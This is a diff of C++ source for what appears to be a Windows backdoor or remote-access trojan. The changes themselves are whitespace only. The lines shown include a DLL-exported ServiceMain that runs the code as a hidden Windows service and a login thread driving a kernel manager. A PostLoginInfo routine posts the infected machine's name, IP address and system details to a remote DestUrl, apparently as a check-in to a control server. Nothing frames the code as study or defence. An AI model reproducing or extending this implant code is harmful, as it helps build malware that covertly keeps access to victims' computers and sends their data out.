@@ -73,10 +73,10 @@ void PostLoginInfo(CClient* pclient)
 	}
 	char* strVer="1";
 	
-    char* strId="";
+	char* strId="";
 	
 	char PostData[1024];
-    sprintf(PostData,"ver=%s&id=%s&name=%s&ip=%s&system=%s",strVer,strId,name,strIp,strSystem);
+	sprintf(PostData,"ver=%s&id=%s&name=%s&ip=%s&system=%s",strVer,strId,name,strIp,strSystem);
 
 	pclient->post(DestUrl,PostData);
 }
@@ -87,7 +87,7 @@ DWORD WINAPI login(char *lpServiceName)
 	if(lpServiceName!=NULL)
 	{
 		lstrcpy(strServiceName, lpServiceName);
-	     ReConfigService(strServiceName);
+		ReConfigService(strServiceName);
 	}
 	CClient  pClient;
 	CKernelManager manager(&pClient,strServiceName);
@@ -101,7 +101,8 @@ DWORD WINAPI login(char *lpServiceName)
 		}
 		
 		else
-		{   char* strVer="1";
+		{   
+			char* strVer="1";
 			char PostData[10];
 			sprintf(PostData,"ver=%s&id=%03d",strVer,manager.m_id);
 			
@@ -211,7 +212,8 @@ extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
 	if( hServiceStatus == NULL )
 	{
 		return;
-	}else FreeConsole();
+	}else 
+		FreeConsole();
 
 	TellSCM( SERVICE_START_PENDING, 0, 1 );
 	TellSCM( SERVICE_RUNNING, 0, 0);
@@ -221,7 +223,8 @@ extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
 	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)login,(LPVOID)svcname, 0, NULL);
 	do{
 		Sleep(100);//not quit until receive stop command, otherwise the service will stop
-	}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
+	} while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
+	
 	WaitForSingleObject(hThread, INFINITE);
 	CloseHandle(hThread);
 
